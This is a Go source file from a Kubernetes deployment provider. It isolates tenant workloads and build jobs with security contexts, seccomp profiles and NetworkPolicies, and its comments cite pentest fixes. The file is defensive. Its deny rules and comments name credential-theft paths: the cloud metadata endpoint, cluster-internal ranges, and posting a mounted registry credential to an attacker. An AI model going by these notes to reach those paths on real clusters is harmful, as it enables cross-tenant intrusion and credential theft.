// Package k8s implements the compute.Provider interface using the local Kubernetes
// cluster (Rancher Desktop / k3s). Images are built via a docker subprocess and
// are available to k3s because Rancher Desktop shares the Docker image store.
package k8s

import (
	"archive/tar"
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	networkingv1 "k8s.io/api/networking/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"

	compute "instant.dev/internal/providers/compute"
)

const (
	imageRegistry = "instant-apps"
	labelApp      = "instant-app"
	labelAppID    = "instant-app-id"

	// labelCustomerResourceRole / labelCustomerResourceRoleValue are the namespace
	// labels applied to every instant-customer-* namespace by the provisioner.
	// The deploy-side NetworkPolicy egress rule for DB ports uses these to select
	// which namespaces a customer deployment may reach.
	labelCustomerResourceRole      = "instant.dev/role"
	labelCustomerResourceRoleValue = "customer-resource"

	// labelOwnerTeam is the namespace label applied to dedicated (k8s-backed)
	// customer-resource namespaces by the provisioner.  Combined with
	// labelCustomerResourceRole in the NetworkPolicy DB-egress selector, it
	// ensures a deployment can only reach its own team's databases.
	// Pentest fix: 2026-05-16.
	labelOwnerTeam = "instant.dev/owner-team"
)

// ── Container-isolation constants ─────────────────────────────────────────────
//
// These values are applied uniformly to every pod spec created by this package.
// Named constants here so a future refactor cannot silently drop the values by
// editing an inline string in one call site only.

const (
	// capNetBindService is the only Linux capability we re-add after dropping ALL.
	// It allows customer apps to bind ports < 1024 (e.g. 80/443) without root.
	capNetBindService = corev1.Capability("NET_BIND_SERVICE")

	// seccompRuntimeDefault requests the container runtime's default seccomp
	// profile (equivalent to Docker's default profile on most runtimes).
	seccompRuntimeDefault = corev1.SeccompProfileTypeRuntimeDefault

	// buildJobActiveDeadlineSecs is the hard wall-clock timeout applied to every
	// Kaniko build Job (both single-app and stack paths).
	//
	// Without this, a malicious or slow Dockerfile (e.g. RUN sleep 1e9) holds a
	// build slot indefinitely. k8s automatically kills the pod and marks the Job
	// as failed when the deadline is reached, freeing the slot and preventing
	// DoS via unbounded build-queue saturation.
	//
	// 600 seconds (10 minutes) is generous for a real npm/pip/go install;
	// reduce if the median real-world build time warrants it.
	buildJobActiveDeadlineSecs = int64(600)
)

// customerContainerSecCtx returns the SecurityContext applied to every
// customer-workload container (single-app deploy and stack services).
//
// Rationale for each field:
//   - AllowPrivilegeEscalation=false: prevents a child process from gaining
//     more privileges than its parent (blocks setuid-binary privilege escalation).
//   - Capabilities drop NET_RAW: removes raw-socket access (the main in-cluster
//     packet-spoofing / ARP-poisoning vector) while LEAVING the rest of the
//     Docker default set intact.
//
// Why NOT drop ALL (the 2026-05-17 fix): `Drop: ALL` is a restricted-PSS
// pattern that is only safe for images WE control. It also strips CHOWN,
// SETUID, SETGID, DAC_OVERRIDE, FOWNER, … which arbitrary customer images
// routinely need — a root-in-container process still requires the CHOWN
// capability to chown(). Stock `nginx`, `postgres`, `redis` and most images
// that adjust file ownership or drop privileges at startup crash-loop under
// `Drop: ALL` (verified: `nginx: [emerg] chown(...) Operation not permitted`).
// Dropping only NET_RAW keeps the meaningful isolation (no raw sockets, plus
// AllowPrivilegeEscalation=false and the RuntimeDefault seccomp profile on the
// pod) without breaking the deploy product for the most common image types.
//
// Deliberately NOT set on customer containers:
//   - RunAsNonRoot — customer images are arbitrary; many legitimately run as
//     root or have USER 0 in their Dockerfile. A blanket setting would break
//     real customer deployments. This is a future opt-in that requires per-image
//     detection (e.g. inspect image metadata and only set when USER != root).
//   - ReadOnlyRootFilesystem — many frameworks (Node.js, Python, Go with cgo)
//     write to /tmp or the app directory at startup. Setting this unconditionally
//     would cause customer app crashes. Opt-in per-image in a future pass.
func customerContainerSecCtx() *corev1.SecurityContext {
	falseVal := false
	return &corev1.SecurityContext{
		AllowPrivilegeEscalation: &falseVal,
		Capabilities: &corev1.Capabilities{
			// NET_BIND_SERVICE stays available (it is in the Docker default
			// set we are no longer dropping), so privileged-port binds work.
			Drop: []corev1.Capability{"NET_RAW"},
		},
	}
}

// customerPodSecCtx returns the PodSecurityContext applied to every
// customer-workload pod (single-app deploy and stack services).
//
// seccompProfile=RuntimeDefault instructs the container runtime (containerd,
// cri-o) to apply its built-in syscall allowlist, blocking ~400 syscalls that
// are rarely needed but exploited in container-escape CVEs (e.g. clone with
// CLONE_NEWUSER, keyctl, etc.).
//
// RunAsNonRoot and ReadOnlyRootFilesystem are intentionally NOT set here for
// the same reasons documented on customerContainerSecCtx above.
func customerPodSecCtx() *corev1.PodSecurityContext {
	return &corev1.PodSecurityContext{
		SeccompProfile: &corev1.SeccompProfile{
			Type: seccompRuntimeDefault,
		},
	}
}

// Probe timing constants for customer-workload containers. A TCP-socket probe
// is used everywhere — customer apps are arbitrary images, so we cannot assume
// an HTTP health path exists. TCP-connect on the container port proves only
// that the app is listening, which is the safe lowest-common-denominator
// signal of reachability. Timings are deliberately generous because customer
// apps vary wildly in boot time.
const (
	// probeStartupPeriodSec / probeStartupFailureThreshold gate the readiness
	// and liveness probes until the app first listens. failureThreshold * period
	// = 30 * 10s = 5 min of boot grace, so a slow-booting app (large JVM, big
	// migration on start) is not killed before it comes up.
	probeStartupPeriodSec        = 10
	probeStartupFailureThreshold = 30
	probeStartupTimeoutSec       = 3

	// Readiness probe — drives the "healthy" signal: a pod is only Ready (and
	// only receives Service traffic) once a TCP connect succeeds.
	probeReadinessInitialDelaySec = 5
	probeReadinessPeriodSec       = 10
	probeReadinessTimeoutSec      = 3
	probeReadinessFailureThresh   = 3

	// Liveness probe — restarts a hung container. failureThreshold is higher
	// than readiness so a brief stall (GC pause, transient overload) does not
	// trigger a restart; 5 * 15s = 75s of unreachability before a kill.
	probeLivenessPeriodSec     = 15
	probeLivenessTimeoutSec    = 3
	probeLivenessFailureThresh = 5
)

// customerContainerProbes returns the readiness/liveness/startup probe set for
// a customer-workload container listening on the given port. All three are
// TCP-socket probes (see the probe-constant block above for the rationale).
// Shared by the single-app deploy path and stack services so probe behaviour
// is identical across both.
func customerContainerProbes(port int) (readiness, liveness, startup *corev1.Probe) {
	tcpHandler := func() corev1.ProbeHandler {
		return corev1.ProbeHandler{
			TCPSocket: &corev1.TCPSocketAction{Port: intstr.FromInt(port)},
		}
	}
	readiness = &corev1.Probe{
		ProbeHandler:        tcpHandler(),
		InitialDelaySeconds: probeReadinessInitialDelaySec,
		PeriodSeconds:       probeReadinessPeriodSec,
		TimeoutSeconds:      probeReadinessTimeoutSec,
		FailureThreshold:    probeReadinessFailureThresh,
	}
	liveness = &corev1.Probe{
		ProbeHandler:     tcpHandler(),
		PeriodSeconds:    probeLivenessPeriodSec,
		TimeoutSeconds:   probeLivenessTimeoutSec,
		FailureThreshold: probeLivenessFailureThresh,
	}
	startup = &corev1.Probe{
		ProbeHandler:     tcpHandler(),
		PeriodSeconds:    probeStartupPeriodSec,
		TimeoutSeconds:   probeStartupTimeoutSec,
		FailureThreshold: probeStartupFailureThreshold,
	}
	return readiness, liveness, startup
}

// curlImageUID / curlImageGID are the numeric uid/gid of `curlimages/curl`
// (the image's `curl_user`). RunAsNonRoot REQUIRES a numeric RunAsUser —
// k8s cannot verify a non-numeric image user is non-root and refuses to
// start the container ("image has non-numeric user (curl_user), cannot
// verify user is non-root"). Setting these explicitly is what makes the
// hardened platformContainerSecCtx actually schedulable.
const (
	curlImageUID int64 = 100
	curlImageGID int64 = 100
)

const (
	// envClusterPodCIDR / envClusterServiceCIDR override the cluster-internal
	// CIDR ranges excepted from the customer-deploy internet-egress
	// NetworkPolicy. Both accept a comma-separated list of CIDRs.
	envClusterPodCIDR     = "CLUSTER_POD_CIDR"
	envClusterServiceCIDR = "CLUSTER_SERVICE_CIDR"

	// metadataCIDR is the link-local range covering the cloud instance
	// metadata endpoint (169.254.169.254 on DO / AWS / GCP). It is ALWAYS
	// in the egress Except list — customer workloads must never reach it.
	metadataCIDR = "169.254.0.0/16"
)

const (
	// ── Build-pod network-isolation constants (P1-W3-19 / P1-W5-12) ──────────
	//
	// The Kaniko build Job runs the CUSTOMER's Dockerfile RUN steps as root for
	// up to buildJobActiveDeadlineSecs (10 min). Before this policy existed the
	// build namespace had NO NetworkPolicy until setupTenantNamespace retrofitted
	// one AFTER the build finished — leaving the build pod with unrestricted
	// egress (cloud metadata at 169.254.169.254, the kube-apiserver, other
	// tenants' DB pods) for the full build window. buildNetworkPolicyName is
	// installed by createBuildNetworkPolicy in buildImage, BEFORE the Job is
	// created, and is later upgraded in place by setupTenantNamespace.

	// buildNetworkPolicyName is the NetworkPolicy applied to the build namespace
	// for the duration of the kaniko build. setupTenantNamespace installs a
	// NetworkPolicy under a DIFFERENT name (instant-isolation); both can coexist
	// (k8s unions all NetworkPolicies selecting a pod), and the build policy is
	// strictly the more restrictive of the two — it has no DB-port egress rule.
	buildNetworkPolicyName = "instant-build-isolation"

	// dataNamespaceName is the namespace housing the in-cluster object store
	// (MinIO) that serves the kaniko build context. The build NetworkPolicy
	// allows egress here ONLY on the object-store port so kaniko can fetch the
	// presigned build-context tarball — every other in-cluster destination
	// stays blocked.
	dataNamespaceName = "instant-data"

	// objectStorePort is the in-cluster MinIO API port the kaniko init-container
	// curls the build context from.
	objectStorePort = 9000

	// httpsPort / httpPort are the egress ports the kaniko build pod needs to
	// reach the external image registry (GHCR) to push the built image, and any
	// external (non-MinIO) build-context object store. Cluster-internal IPs are
	// still blocked via egressExceptCIDRs(); only genuine public registry/object
	// store endpoints are reachable on these ports.
	httpsPort = 443
	httpPort  = 80

	// pssEnforceLabel / pssWarnLabel are the Pod Security Standards namespace
	// label keys. pssBaseline is the policy level applied at enforce time —
	// "baseline" blocks host namespaces, privileged containers and hostPath
	// while still allowing the writes a real build needs.
	pssEnforceLabel = "pod-security.kubernetes.io/enforce"
	pssWarnLabel    = "pod-security.kubernetes.io/warn"
	pssBaseline     = "baseline"
	pssRestricted   = "restricted"
)

// defaultClusterPodCIDRs / defaultClusterServiceCIDRs are the union of the
// CIDR ranges used by the two clusters this platform runs on:
//   - k3s / Rancher Desktop (local dev): pods 10.42.0.0/16, services 10.43.0.0/16
//   - DOKS (production):                 pods 10.244.0.0/16, services 10.245.0.0/16
//
// Excepting the union keeps customer containers off other tenants' DB pods
// and the kube-apiserver on BOTH clusters without per-environment config.
// Override via CLUSTER_POD_CIDR / CLUSTER_SERVICE_CIDR when the cluster uses
// a non-standard range.
var (
	defaultClusterPodCIDRs     = []string{"10.42.0.0/16", "10.244.0.0/16"}
	defaultClusterServiceCIDRs = []string{"10.43.0.0/16", "10.245.0.0/16"}
)

// egressExceptCIDRs returns the IPBlock.Except list for the customer-deploy
// internet-egress NetworkPolicy: the cluster pod + service ranges (so customer
// apps cannot reach internal cluster IPs) plus the cloud metadata link-local
// range. CLUSTER_POD_CIDR / CLUSTER_SERVICE_CIDR override the cluster ranges
// (comma-separated); metadataCIDR is always included.
func egressExceptCIDRs() []string {
	pods := defaultClusterPodCIDRs
	if v := strings.TrimSpace(os.Getenv(envClusterPodCIDR)); v != "" {
		pods = splitCIDRList(v)
	}
	svcs := defaultClusterServiceCIDRs
	if v := strings.TrimSpace(os.Getenv(envClusterServiceCIDR)); v != "" {
		svcs = splitCIDRList(v)
	}

	except := make([]string, 0, len(pods)+len(svcs)+1)
	except = append(except, pods...)
	except = append(except, svcs...)
	except = append(except, metadataCIDR)
	return except
}

// splitCIDRList parses a comma-separated CIDR list, trimming whitespace and
// dropping empty entries.
func splitCIDRList(s string) []string {
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// platformContainerSecCtx returns the SecurityContext for the PLATFORM-OWNED
// curl init-container (`fetch-context`). It runs a known, pinned image
// controlled by instant.dev, so we apply the stricter set:
//   - RunAsNonRoot=true + an explicit numeric RunAsUser/RunAsGroup (100) so
//     the kubelet can verify non-root and the container actually starts.
//   - ReadOnlyRootFilesystem=true — curl writes only to its declared volume.
//
// NOTE: the Kaniko build container does NOT use this — it sets its own
// SecurityContext without RunAsNonRoot (kaniko requires uid=0).
func platformContainerSecCtx() *corev1.SecurityContext {
	falseVal := false
	trueVal := true
	uid := curlImageUID
	gid := curlImageGID
	return &corev1.SecurityContext{
		AllowPrivilegeEscalation: &falseVal,
		RunAsNonRoot:             &trueVal,
		RunAsUser:                &uid,
		RunAsGroup:               &gid,
		ReadOnlyRootFilesystem:   &trueVal,
		Capabilities: &corev1.Capabilities{
			Drop: []corev1.Capability{"ALL"},
		},
	}
}

// platformPodSecCtx returns the PodSecurityContext for platform-owned pods
// (Kaniko build jobs). Includes seccomp RuntimeDefault.
func platformPodSecCtx() *corev1.PodSecurityContext {
	return &corev1.PodSecurityContext{
		SeccompProfile: &corev1.SeccompProfile{
			Type: seccompRuntimeDefault,
		},
	}
}

// BuildContextConfig holds the MinIO/S3 settings used to deliver the kaniko
// build context. When Endpoint is empty, the K8sProvider falls back to the
// legacy k8s-Secret delivery (capped at ~1 MiB by etcd's object size limit).
// When set, the tarball is uploaded to MinIO and kaniko is pointed at the
// resulting s3:// URL — lifting the practical cap to the multipart limit
// enforced in the handler (currently 50 MiB).
type BuildContextConfig struct {
	Endpoint   string // host:port of MinIO server (e.g. "minio.instant-data.svc.cluster.local:9000")
	AccessKey  string // MinIO admin access key
	SecretKey  string // MinIO admin secret key
	BucketName string // bucket for build contexts (e.g. "instant-build-contexts")
	UseSSL     bool   // false for in-cluster MinIO; true for TLS-terminated endpoints
}

// K8sProvider implements compute.Provider using the local k8s cluster.
type K8sProvider struct {
	clientset kubernetes.Interface // accepts both *Clientset and *fake.Clientset (tests)
	namespace string               // shared namespace (legacy fallback); per-deploy namespaces are preferred
	buildCtx  BuildContextConfig   // MinIO settings for kaniko build context delivery

	// buildLogCache snapshots the kaniko pod logs of a FAILED build the moment
	// waitForJobComplete reports JobFailed — while the pod is still guaranteed
	// alive. P1-G (bug hunt 2026-05-17 round 2): the autopsy's
	// fetchBuildLogsForAutopsy used to read logs live, racing the kaniko Job's
	// 300s TTLSecondsAfterFinished; on a slow failure path the pod was already
	// GC'd and failure.last_lines came back empty. FetchBuildLogs now consults
	// this cache first so the autopsy always has the build output.
	// Keyed by appID → *buildLogCacheEntry.
	buildLogCache sync.Map
}

// buildLogCacheEntry is one cached build-log snapshot plus the time it was
// captured, so stale entries can be evicted.
type buildLogCacheEntry struct {
	lines      []string
	capturedAt time.Time
}

// buildLogCacheTTL bounds how long a captured build-log snapshot is retained.
// Generously longer than the kaniko Job TTL (300s) and any plausible autopsy
// delay, but finite so a long-lived api pod does not leak memory on every
// failed build.
const buildLogCacheTTL = 30 * time.Minute

// New creates a K8sProvider targeting the given namespace.
// buildCtx is optional — when unset, builds fall back to the 1 MiB Secret path.
// Returns an error if the k8s clientset cannot be initialized; the caller
// should fall back to noop in that case.
func New(namespace string, buildCtx BuildContextConfig) (*K8sProvider, error) {
	if namespace == "" {
		namespace = "instant-apps"
	}
	cs, err := newClientset()
	if err != nil {
		return nil, fmt.Errorf("k8s.New: %w", err)
	}
	p := &K8sProvider{
		clientset: cs,
		namespace: namespace,
		buildCtx:  buildCtx,
	}
	// Ensure the shared namespace exists (idempotent).
	if err := p.ensureNamespace(context.Background()); err != nil {
		return nil, fmt.Errorf("k8s.New: ensure namespace: %w", err)
	}
	return p, nil
}

// newClientset builds a *kubernetes.Clientset, preferring in-cluster config and
// falling back to the default kubeconfig file for local development.
func newClientset() (*kubernetes.Clientset, error) {
	cfg, err := rest.InClusterConfig()
	if err != nil {
		// Fall back to kubeconfig (local dev)
		cfg, err = clientcmd.BuildConfigFromFlags("", clientcmd.RecommendedHomeFile)
		if err != nil {
			return nil, fmt.Errorf("k8s config: %w", err)
		}
	}
	return kubernetes.NewForConfig(cfg)
}

// ensureNamespace creates the shared namespace if it doesn't already exist.
func (p *K8sProvider) ensureNamespace(ctx context.Context) error {
	ns := &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{
			Name: p.namespace,
			Labels: map[string]string{
				"managed-by": "instant.dev",
			},
		},
	}
	_, err := p.clientset.CoreV1().Namespaces().Create(ctx, ns, metav1.CreateOptions{})
	if err != nil && !apierrors.IsAlreadyExists(err) {
		return fmt.Errorf("create namespace %q: %w", p.namespace, err)
	}
	return nil
}

// deployNamespace returns the per-deployment namespace name for an appID.
// Format: "instant-deploy-{appID}"
func deployNamespace(appID string) string {
	return "instant-deploy-" + appID
}

// setupTenantNamespace creates a namespace with all required security primitives:
// PSS baseline labels, default-deny NetworkPolicy, ResourceQuota, LimitRange.
// namespaceName: the k8s namespace name (e.g. "instant-deploy-abc" or "instant-stack-xyz")
// tenantID: used for labels (instant.dev/tenant label)
// tier: "hobby"|"pro"|"team" — controls ResourceQuota and LimitRange sizes
// teamID: owning team UUID — scopes the NetworkPolicy DB-port egress to this
// team's customer-resource namespaces only, preventing cross-tenant DB access.
// Pass empty string for unowned/anonymous deploys (NetworkPolicy falls back to
// role-only selector, less restrictive but acceptable for anonymous workloads).
func (p *K8sProvider) setupTenantNamespace(ctx context.Context, namespaceName, tenantID, teamID, tier string) error {
	// Step 1: Create namespace with PSS labels.
	ns := &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{
			Name: namespaceName,
			Labels: map[string]string{
				// Pod Security Standards: enforce baseline, warn on restricted.
				// "baseline" blocks known privilege escalation vectors (host namespaces,
				// privileged containers, hostPath) while allowing /tmp writes, etc.
				pssEnforceLabel: pssBaseline,
				pssWarnLabel:    pssRestricted,
				// Tenant labels for auditing and network policy selectors.
				"instant.dev/tenant": tenantID,
				"instant.dev/tier":   tier,
				"managed-by":         "instant.dev",
			},
		},
	}
	_, err := p.clientset.CoreV1().Namespaces().Create(ctx, ns, metav1.CreateOptions{})
	if apierrors.IsAlreadyExists(err) {
		// buildImage may have created the namespace first (it brings the
		// namespace up before the kaniko Job so the build NetworkPolicy can be
		// installed). buildImage already stamps the PSS labels, but upgrade the
		// full label set here idempotently so a namespace created by any older
		// path still ends up with enforce=baseline + the tenant labels.
		if uerr := p.upgradeNamespaceLabels(ctx, namespaceName, ns.Labels); uerr != nil {
			return fmt.Errorf("upgrade namespace labels %q: %w", namespaceName, uerr)
		}
	} else if err != nil {
		return fmt.Errorf("create namespace %q: %w", namespaceName, err)
	}

	// Step 2: Default-deny NetworkPolicy with targeted allow rules.
	// teamID scopes the DB-port egress to the team's own customer namespaces.
	if err := p.createNetworkPolicyInNS(ctx, namespaceName, teamID); err != nil {
		return fmt.Errorf("create network policy in %q: %w", namespaceName, err)
	}

	// Step 3: ResourceQuota per tier.
	if err := p.createResourceQuotaInNS(ctx, namespaceName, tier); err != nil {
		return fmt.Errorf("create resource quota in %q: %w", namespaceName, err)
	}

	// Step 4: LimitRange with per-pod defaults.
	if err := p.createLimitRangeForNS(ctx, namespaceName, tier); err != nil {
		return fmt.Errorf("create limit range in %q: %w", namespaceName, err)
	}

	return nil
}

// createDeployNamespace creates a per-deployment namespace with Pod Security Standards
// labels and relevant tenant labels. Uses "baseline" enforcement (not "restricted")
// because restricted blocks legitimate patterns like writing to /tmp.
func (p *K8sProvider) createDeployNamespace(ctx context.Context, appID, teamID, tier string) error {
	return p.setupTenantNamespace(ctx, deployNamespace(appID), appID, teamID, tier)
}

// ptrProto / ptrPort — addressable temporaries for inline NetworkPolicyPort literals.
// Avoids the "address of unaddressable value" compile error when building Protocol/Port
// pointer fields without naming each one separately.
func ptrProto(p corev1.Protocol) *corev1.Protocol { return &p }
func ptrPort(p int) *intstr.IntOrString           { v := intstr.FromInt(p); return &v }

// createNetworkPolicyInNS installs a default-deny NetworkPolicy in the given namespace
// and adds targeted allow rules:
//   - Allow DNS egress to kube-system (UDP+TCP port 53) — required for hostname resolution
//   - Allow intra-namespace pod-to-pod communication
//   - Allow ingress from the "instant" namespace (API health checks)
//
// teamID scopes the DB-port egress rule to the team's own customer-resource namespaces.
// When teamID is non-empty, the selector uses BOTH "instant.dev/role=customer-resource"
// AND "instant.dev/owner-team=<teamID>" so a deployment can only reach databases
// provisioned under its own team — not another tenant's.  This closes the
// cross-tenant network-isolation gap confirmed by pentest on 2026-05-16.
//
// When teamID is empty (anonymous deploys), the rule falls back to the role-only
// selector — less restrictive, but acceptable: anonymous namespaces have no
// dedicated databases to protect against each other in the same way.
//
// This blocks user app pods from reaching postgres-platform, redis, or other tenants' namespaces.
func (p *K8sProvider) createNetworkPolicyInNS(ctx context.Context, ns, teamID string) error {
	proto53UDP := corev1.ProtocolUDP
	proto53TCP := corev1.ProtocolTCP
	port53 := intstr.FromInt(53)

	// Build the DB-port egress selector.
	//
	// SECURITY: When teamID is set, both labels MUST match. A deployment from
	// team A cannot reach namespaces labelled owner-team=B even though they
	// share the role=customer-resource label. This enforces the tenant boundary
	// at the network layer (defence-in-depth alongside application-level auth).
	dbEgressLabels := map[string]string{
		labelCustomerResourceRole: labelCustomerResourceRoleValue,
	}
	if teamID != "" {
		dbEgressLabels[labelOwnerTeam] = teamID
	}

	np := &networkingv1.NetworkPolicy{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "instant-isolation",
			Namespace: ns,
		},
		Spec: networkingv1.NetworkPolicySpec{
			// Select all pods in the namespace.
			PodSelector: metav1.LabelSelector{},
			PolicyTypes: []networkingv1.PolicyType{
				networkingv1.PolicyTypeIngress,
				networkingv1.PolicyTypeEgress,
			},
			Ingress: []networkingv1.NetworkPolicyIngressRule{
				{
					// Allow intra-namespace pod-to-pod (e.g., multi-container apps).
					From: []networkingv1.NetworkPolicyPeer{
						{
							PodSelector: &metav1.LabelSelector{},
						},
					},
				},
				{
					// Allow ingress from the "instant" API namespace (health checks, proxying).
					From: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": "instant",
								},
							},
						},
					},
				},
				{
					// Allow ingress from kube-system (ingress controller / Traefik).
					From: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": "kube-system",
								},
							},
						},
					},
				},
				{
					// Allow ingress from nginx-ingress namespace. Required because
					// Cilium-backed clusters (DOKS default) do NOT match in-cluster
					// pod IPs against an "0.0.0.0/0" ipBlock — nginx-ingress traffic
					// would otherwise be blocked.
					From: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": "ingress-nginx",
								},
							},
						},
					},
				},
				{
					// Allow external ingress (NodePort traffic from the host / Lima VM).
					// Required when STACK_EXPOSE_VIA=nodeport; harmless when using Ingress.
					From: []networkingv1.NetworkPolicyPeer{
						{
							IPBlock: &networkingv1.IPBlock{
								CIDR: "0.0.0.0/0",
								// Keep internal instant namespaces isolated — only block egress there.
							},
						},
					},
				},
			},
			Egress: []networkingv1.NetworkPolicyEgressRule{
				{
					// Allow intra-namespace egress (pod-to-pod within the deployment namespace).
					To: []networkingv1.NetworkPolicyPeer{
						{
							PodSelector: &metav1.LabelSelector{},
						},
					},
				},
				{
					// Allow egress to THIS TEAM'S dedicated DB pods in customer-resource namespaces.
					//
					// SECURITY FIX (pentest 2026-05-16): previously the selector only matched
					// "instant.dev/role=customer-resource", allowing ANY deployment to reach
					// ANY other tenant's database. Now the selector ALSO requires
					// "instant.dev/owner-team=<teamID>" so a deployment can only reach the
					// namespaces owned by its own team.
					//
					// Preservation of legitimate access: a deployment WITH a resource_binding
					// to its own team's DB has teamID == the label on those namespaces →
					// still reachable. Other teams' namespaces → blocked at the network layer.
					//
					// When teamID is empty (anonymous deploy) we keep the role-only selector
					// as a safe fallback.
					To: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: dbEgressLabels,
							},
						},
					},
					Ports: []networkingv1.NetworkPolicyPort{
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(5432)},  // postgres
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(6379)},  // redis
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(27017)}, // mongo
						{Protocol: ptrProto(corev1.ProtocolTCP), Port: ptrPort(4222)},  // nats
					},
				},
				// NOTE: The former rule that allowed DB-port egress to the entire "instant"
				// namespace (platform Redis, platform Postgres) has been intentionally
				// removed.  Customer deployments have no legitimate need to reach
				// platform-internal datastores — the shared proxies (pg-proxy, redis-proxy)
				// face the public internet, not cluster-internal ports.  Removing this rule
				// eliminates gap (a) from the 2026-05-16 pentest finding.
				{
					// Allow DNS resolution via kube-dns in kube-system (UDP + TCP port 53).
					// Without this, hostname resolution fails entirely.
					To: []networkingv1.NetworkPolicyPeer{
						{
							NamespaceSelector: &metav1.LabelSelector{
								MatchLabels: map[string]string{
									"kubernetes.io/metadata.name": "kube-system",
								},
							},
						},
					},
					Ports: []networkingv1.NetworkPolicyPort{
						{Protocol: &proto53UDP, Port: &port53},
						{Protocol: &proto53TCP, Port: &port53},
					},
				},
				{
					// Allow general internet egress (user apps need to call external APIs).
					// Cluster-internal CIDRs and the cloud metadata endpoint (169.254.169.254)
					// are in the Except list — user apps must not be able to exfiltrate
					// credentials from the DO/AWS instance metadata service.
					//
					// SECURITY FIX (pentest 2026-05-16 gap b): 169.254.0.0/16 (link-local)
					// added to Except so the DO droplet metadata endpoint at
					// 169.254.169.254 is unreachable from customer workloads.
					//
					// SECURITY FIX (P0-2, 2026-05-17): the Except list previously
					// hardcoded ONLY the k3s ranges (10.42/16, 10.43/16). Production
					// runs on DOKS (pods 10.244.0.0/16, services 10.245.0.0/16),
					// which were NOT excepted — so customer containers could reach
					// other tenants' DB pods and the kube-apiserver. egressExceptCIDRs
					// returns the union of both clusters' ranges plus the metadata
					// CIDR, and is overridable via CLUSTER_POD_CIDR / CLUSTER_SERVICE_CIDR.
					To: []networkingv1.NetworkPolicyPeer{
						{
							IPBlock: &networkingv1.IPBlock{
								CIDR:   "0.0.0.0/0",
								Except: egressExceptCIDRs(),
							},
						},
					},
				},
			},
		},
	}
	if err := p.upsertNetworkPolicy(ctx, ns, np); err != nil {
		return fmt.Errorf("create network policy in %q: %w", ns, err)
	}
	return nil
}

// upsertNetworkPolicy creates the NetworkPolicy, or updates it in place when it
// already exists. Idempotent apply semantics matter for the build path: the
// kaniko-stage build NetworkPolicy may already be present when a later call
// installs/upgrades the tenant-isolation policy, and a plain Create that
// tolerated AlreadyExists would silently keep a stale spec instead of
// upgrading it.
func (p *K8sProvider) upsertNetworkPolicy(ctx context.Context, ns string, np *networkingv1.NetworkPolicy) error {
	_, err := p.clientset.NetworkingV1().NetworkPolicies(ns).Create(ctx, np, metav1.CreateOptions{})
	if err == nil {
		return nil
	}
	if !apierrors.IsAlreadyExists(err) {
		return err
	}
	existing, gerr := p.clientset.NetworkingV1().NetworkPolicies(ns).Get(ctx, np.Name, metav1.GetOptions{})
	if gerr != nil {
		return fmt.Errorf("get existing network policy %q: %w", np.Name, gerr)
	}
	existing.Spec = np.Spec
	existing.Labels = np.Labels
	_, uerr := p.clientset.NetworkingV1().NetworkPolicies(ns).Update(ctx, existing, metav1.UpdateOptions{})
	return uerr
}

// upgradeNamespaceLabels merges the given labels onto an existing namespace.
// Used when buildImage created the namespace before setupTenantNamespace runs:
// it guarantees the PSS enforce/warn labels and tenant labels are present even
// on a namespace first created by an older code path.
func (p *K8sProvider) upgradeNamespaceLabels(ctx context.Context, namespaceName string, labels map[string]string) error {
	existing, err := p.clientset.CoreV1().Namespaces().Get(ctx, namespaceName, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("get namespace: %w", err)
	}
	if existing.Labels == nil {
		existing.Labels = map[string]string{}
	}
	changed := false
	for k, v := range labels {
		if existing.Labels[k] != v {
			existing.Labels[k] = v
			changed = true
		}
	}
	if !changed {
		return nil
	}
	_, err = p.clientset.CoreV1().Namespaces().Update(ctx, existing, metav1.UpdateOptions{})
	return err
}

// createBuildNetworkPolicy installs a build-scoped default-deny NetworkPolicy
// in the kaniko build namespace BEFORE the build Job is created (P1-W3-19 /
// P1-W5-12).
//
// The kaniko Job runs the customer's Dockerfile RUN steps as root. Without this
// policy the build pod had unrestricted egress for the full ≤10-min build
// window — it could reach the cloud metadata endpoint (169.254.169.254), the
// kube-apiserver, and other tenants' DB pods, and could POST the mounted
// registry credential (/kaniko/.docker/config.json) to an attacker.
//
// The policy is intentionally MORE restrictive than the tenant-isolation
// policy setupTenantNamespace installs later: it has NO DB-port egress rule at
// all. Egress is permitted ONLY to:
//   - DNS (kube-dns in kube-system, UDP+TCP 53) — required for any hostname.
//   - the in-cluster object store (instant-data namespace, objectStorePort) —
//     the kaniko init-container fetches the presigned build-context tarball.
//   - external internet on httpPort/httpsPort — kaniko pushes the built image
//     to the registry (GHCR). Cluster-internal CIDRs + the metadata CIDR are in
//     the Except list (egressExceptCIDRs), so "external internet" genuinely
//     excludes other tenants' pods and the kube-apiserver.
//
// Ingress is fully denied — a build pod is never a server.
//
// k8s unions all NetworkPolicies that select a pod, and this policy carries a
// distinct name (buildNetworkPolicyName) from the tenant-isolation policy, so
// the two coexist; the effective egress is the union, which is still bounded
// because neither policy grants metadata/apiserver access.
